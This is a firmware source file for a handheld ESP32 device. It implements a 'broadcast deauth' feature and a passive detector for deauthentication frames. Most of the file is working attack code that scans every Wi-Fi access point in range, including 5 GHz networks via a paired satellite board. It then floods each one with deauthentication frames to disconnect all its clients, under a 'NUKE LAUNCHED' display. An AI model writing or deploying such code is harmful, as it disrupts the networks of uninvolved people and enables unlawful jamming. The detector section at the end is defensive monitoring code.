/*
 * wifi_deauth_extras — broadcast deauth (kick ALL clients on an AP at
 * once) and passive deauth detector.
 */
#include "app.h"
#include "../theme.h"
#include "ui.h"
#include "input.h"
#include "radio.h"
#include "wifi_types.h"
#include "wifi_deauth_frame.h"
#include "c5_cmd.h"
#include <WiFi.h>
#include <esp_wifi.h>

/* ========== Broadcast deauth: nuke every AP in range ========== */

#define DB_MAX_APS 64

struct db_target_t {
    uint8_t bssid[6];
    uint8_t channel;
    char    ssid[24];
    bool    is_5g;   /* true -> delegate deauth to the C5 satellite */
};
static db_target_t s_b_targets[DB_MAX_APS];
static volatile int s_b_target_n = 0;
static volatile int s_b_cursor = 0;
static volatile bool     s_b_running = false;
static volatile uint32_t s_b_sent    = 0;
static volatile uint32_t s_b_errs    = 0;
static uint16_t          s_b_seq     = 0;

static void broad_task(void *)
{
    /* Rotate through every AP. 2.4 GHz targets are deauthed locally via
     * the usual softAP + 80211_tx path. 5 GHz targets get delegated to
     * the C5/TRIDENT satellite over ESP-NOW — the S3 can't tune to 5 GHz
     * channels, so without the C5 those APs are silent. */
    wifi_silent_ap_begin(1);
    uint32_t last_5g_cmd = 0;
    while (s_b_running) {
        if (s_b_target_n == 0) { delay(100); continue; }
        const db_target_t &t = s_b_targets[s_b_cursor % s_b_target_n];

        if (t.is_5g) {
            /* Don't hammer the C5 — one 3-second burst per 5 GHz target
             * per rotation. C5 can only run one attack at a time. */
            if (millis() - last_5g_cmd > 200) {
                c5_cmd_deauth(t.bssid, t.channel, 0 /* targeted */, 3000);
                last_5g_cmd = millis();
                /* Count the C5 frame budget against our displayed sent
                 * counter — user feedback only, not exact. 3 s / 2 ms
                 * airtime ≈ 1500 frames per C5 burst. */
                s_b_sent += 1500;
            }
            delay(400);   /* give the C5 time between rotations */
        } else {
            esp_wifi_set_channel(t.channel ? t.channel : 1, WIFI_SECOND_CHAN_NONE);
            for (int i = 0; i < 16 && s_b_running; ++i) {
                int ok = wifi_deauth_broadcast(t.bssid, &s_b_seq);
                s_b_sent += ok;
                s_b_errs += (2 - ok);
                delay(6);
            }
        }
        s_b_cursor++;
    }
    wifi_silent_ap_end();
    vTaskDelete(nullptr);
}

static void db_scan_populate(void)
{
    s_b_target_n = 0;
    int n = WiFi.scanNetworks(false, true, false, 120);
    if (n > 0) {
        for (int i = 0; i < n && s_b_target_n < DB_MAX_APS; ++i) {
            db_target_t &t = s_b_targets[s_b_target_n++];
            memcpy(t.bssid, WiFi.BSSID(i), 6);
            t.channel = WiFi.channel(i);
            strncpy(t.ssid, WiFi.SSID(i).c_str(), sizeof(t.ssid) - 1);
            t.ssid[sizeof(t.ssid) - 1] = '\0';
            t.is_5g = false;   /* S3 WiFi.scan never returns 5 GHz anyway */
        }
    }
    WiFi.scanDelete();

    /* If a C5/TRIDENT satellite is paired, fire off a 5 GHz scan over
     * ESP-NOW and wait a moment for RESP_AP frames to land. APs we get
     * back are appended with is_5g=true so broad_task delegates their
     * deauth bursts to the C5 instead of trying to TX locally. */
    if (c5_any_online()) {
        c5_clear_results();
        c5_cmd_scan_5g(600);
        /* Scan takes ~600 ms of C5 dwell plus a couple hundred ms of
         * ESP-NOW result streaming — poll-wait up to 2 s for frames. */
        uint32_t deadline = millis() + 2000;
        uint32_t last_check = 0;
        int last_n = 0;
        while (millis() < deadline) {
            if (millis() - last_check > 150) {
                last_check = millis();
                c5_ap_t tmp[4];
                int cur = c5_aps(tmp, 4);
                if (cur == last_n && cur > 0) break;   /* quiesced */
                last_n = cur;
            }
            delay(50);
        }
        c5_ap_t aps[64];
        int n5 = c5_aps(aps, 64);
        for (int i = 0; i < n5 && s_b_target_n < DB_MAX_APS; ++i) {
            if (!aps[i].is_5g) continue;
            db_target_t &t = s_b_targets[s_b_target_n++];
            memcpy(t.bssid, aps[i].bssid, 6);
            t.channel = aps[i].channel;
            strncpy(t.ssid, aps[i].ssid, sizeof(t.ssid) - 1);
            t.ssid[sizeof(t.ssid) - 1] = '\0';
            t.is_5g = true;
        }
    }
}

void feat_wifi_deauth_broadcast(void)
{
    radio_switch(RADIO_WIFI);
    WiFi.mode(WIFI_STA);

    auto &d = M5Cardputer.Display;
    ui_clear_body();
    d.setTextColor(T_WARN, T_BG);
    d.setCursor(4, BODY_Y + 2); d.print("NUKING ALL APs");
    d.setTextColor(T_DIM, T_BG);
    d.setCursor(4, BODY_Y + 20); d.print("scanning 2.4 GHz...");
    ui_draw_footer("scanning");
    ui_radar(SCR_W / 2, BODY_Y + 60, 24, T_ACCENT);

    db_scan_populate();
    if (s_b_target_n == 0) {
        ui_toast("no APs found", T_BAD, 1500);
        return;
    }

    esp_wifi_set_promiscuous(true);
    s_b_sent = 0;
    s_b_errs = 0;
    s_b_cursor = 0;
    s_b_seq = (uint16_t)(esp_random() & 0x0FFF);
    s_b_running = true;
    xTaskCreate(broad_task, "deauth_all", 3072, nullptr, 4, nullptr);

    /* Permanent NUKE dashboard — the intro splash aesthetic kept as the
     * live view. Glitch field + scan lines + 3x halo headline + bottom
     * stats ribbon. Updates every 200 ms while frames fly. No more
     * boring text-on-gradient dashboard under the splash. */
    uint32_t last = 0;
    uint32_t last_sent = 0;
    uint16_t color = T_ACCENT2;

    while (true) {
        uint32_t now = millis();

        if (now - last > 200) {
            last = now;
            int cur = s_b_target_n ? (s_b_cursor % s_b_target_n) : 0;

            /* Full redraw — cheap at 5 Hz and lets the glitch field
             * actually flicker. */
            d.fillScreen(0x0000);
            ui_glitch(0, 0, SCR_W, SCR_H);
            for (int y = 0; y < SCR_H; y += 4) {
                d.drawFastHLine(0, y, SCR_W, 0x0020);
            }

            /* Big halo headline — same draw as ui_action_overlay. */
            const char *headline = "NUKE LAUNCHED";
            d.setTextSize(3);
            int hw = d.textWidth(headline) * 3;
            int hx = (SCR_W - hw) / 2;
            int hy = 22;
            d.setTextColor(0xF81F, 0);
            d.setCursor(hx - 2, hy); d.print(headline);
            d.setCursor(hx + 2, hy); d.print(headline);
            d.setCursor(hx, hy - 2); d.print(headline);
            d.setCursor(hx, hy + 2); d.print(headline);
            d.setTextColor(0xFFFF, 0);
            d.setCursor(hx, hy); d.print(headline);
            d.setTextSize(1);

            /* Animated side brackets. */
            int bl = 10 + (int)(sinf(now * 0.01f) * 4);
            d.drawFastHLine(4, hy - 6, bl, color);
            d.drawFastVLine(4, hy - 6, 4, color);
            d.drawFastHLine(4, hy + 28, bl, color);
            d.drawFastVLine(4, hy + 25, 4, color);
            d.drawFastHLine(SCR_W - 4 - bl, hy - 6, bl, color);
            d.drawFastVLine(SCR_W - 5, hy - 6, 4, color);
            d.drawFastHLine(SCR_W - 4 - bl, hy + 28, bl, color);
            d.drawFastVLine(SCR_W - 5, hy + 25, 4, color);

            /* Top-left C5/TRIDENT connection indicator. Green when a
             * satellite is paired — confirms our 5 GHz targets are
             * going out via the C5 and not silently dropped. */
            if (c5_any_online()) {
                d.fillCircle(7, 6, 2, 0x07E0);           /* green dot */
                d.setTextColor(0x07E0, 0);
                d.setCursor(13, 2); d.print("C5");
            } else {
                d.fillCircle(7, 6, 2, 0x528A);           /* dim gray */
                d.setTextColor(0x528A, 0);
                d.setCursor(13, 2); d.print("C5");
            }

            /* Live stats ribbon — bottom third of the screen. */
            uint32_t fps = (s_b_sent - last_sent) * 5;
            last_sent = s_b_sent;

            /* Target line (big). */
            const db_target_t &t = s_b_targets[cur];
            d.setTextColor(T_ACCENT2, 0);
            d.setCursor(4, SCR_H - 44);
            d.printf("-> %.20s", t.ssid[0] ? t.ssid : "<hidden>");

            /* Target detail line (dim). */
            d.setTextColor(0x8410, 0);   /* mid gray, readable on glitch */
            d.setCursor(4, SCR_H - 34);
            d.printf("ch%u %02X:%02X:%02X:%02X:%02X:%02X",
                     t.channel,
                     t.bssid[0], t.bssid[1], t.bssid[2],
                     t.bssid[3], t.bssid[4], t.bssid[5]);

            /* Frames + rate (big, bright). */
            char stats[48];
            snprintf(stats, sizeof(stats), "%lu frames  %lu/s",
                     (unsigned long)s_b_sent, (unsigned long)fps);
            d.setTextColor(fps > 40 ? 0x07E0 : 0xFFE0, 0);
            int sw = d.textWidth(stats);
            d.setCursor((SCR_W - sw) / 2, SCR_H - 22);
            d.print(stats);

            /* Target count + drops. */
            char meta[32];
            snprintf(meta, sizeof(meta), "%d APs  %lu drop",
                     s_b_target_n, (unsigned long)s_b_errs);
            d.setTextColor(0xFFFF, 0);
            int mw = d.textWidth(meta);
            d.setCursor((SCR_W - mw) / 2, SCR_H - 10);
            d.print(meta);
        }

        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(20); continue; }
        if (k == PK_ESC) break;
    }
    s_b_running = false;
    delay(150);
    esp_wifi_set_promiscuous(false);
}

/* ========== Deauth detector: passively count deauth frames ========== */

static volatile uint32_t s_det_count = 0;
static volatile uint32_t s_det_total = 0;
static uint8_t s_det_last_bssid[6] = {0};

static void det_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (type != WIFI_PKT_MGMT) return;
    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    if (pkt->rx_ctrl.sig_len < 26) return;
    uint8_t fc = pkt->payload[0];
    uint8_t subtype = (fc >> 4) & 0xF;
    /* 0xC = deauth, 0xA = disassociation */
    if (subtype == 0xC || subtype == 0xA) {
        s_det_count++;
        s_det_total++;
        memcpy((void *)s_det_last_bssid, pkt->payload + 16, 6);
    }
}

void feat_wifi_deauth_detect(void)
{
    radio_switch(RADIO_WIFI);
    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(det_cb);

    s_det_count = 0;
    s_det_total = 0;
    uint8_t ch = 1;
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);

    ui_clear_body();
    ui_draw_footer(";/.=channel  `=stop");
    uint32_t last = 0;
    uint32_t window_ms = millis();
    uint32_t window_count = 0;
    while (true) {
        if (millis() - last > 300) {
            last = millis();
            if (millis() - window_ms > 1000) {
                window_count = s_det_count;
                s_det_count = 0;
                window_ms = millis();
            }
            auto &d = M5Cardputer.Display;
            ui_clear_body();
            d.setTextColor(T_ACCENT, T_BG);
            d.setCursor(4, BODY_Y + 2); d.print("DEAUTH DETECT");
            d.drawFastHLine(4, BODY_Y + 12, 100, T_ACCENT);
            d.setTextColor(T_FG, T_BG);
            d.setCursor(4, BODY_Y + 22); d.printf("channel : %u", ch);
            d.setTextColor(window_count > 5 ? T_BAD : T_GOOD, T_BG);
            d.setCursor(4, BODY_Y + 34); d.printf("rate    : %lu/s", (unsigned long)window_count);
            d.setTextColor(T_FG, T_BG);
            d.setCursor(4, BODY_Y + 46); d.printf("total   : %lu", (unsigned long)s_det_total);
            if (s_det_total > 0) {
                d.setTextColor(T_DIM, T_BG);
                d.setCursor(4, BODY_Y + 60);
                d.printf("last BSSID %02X:%02X:%02X:%02X:%02X:%02X",
                         s_det_last_bssid[0], s_det_last_bssid[1], s_det_last_bssid[2],
                         s_det_last_bssid[3], s_det_last_bssid[4], s_det_last_bssid[5]);
            }
            ui_draw_status(radio_name(), "dauth-det");
        }
        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(20); continue; }
        if (k == PK_ESC) break;
        if (k == ';' || k == PK_UP)   { if (ch < 13) { ch++; esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE); } }
        if (k == '.' || k == PK_DOWN) { if (ch > 1)  { ch--; esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE); } }
    }
    esp_wifi_set_promiscuous(false);
}
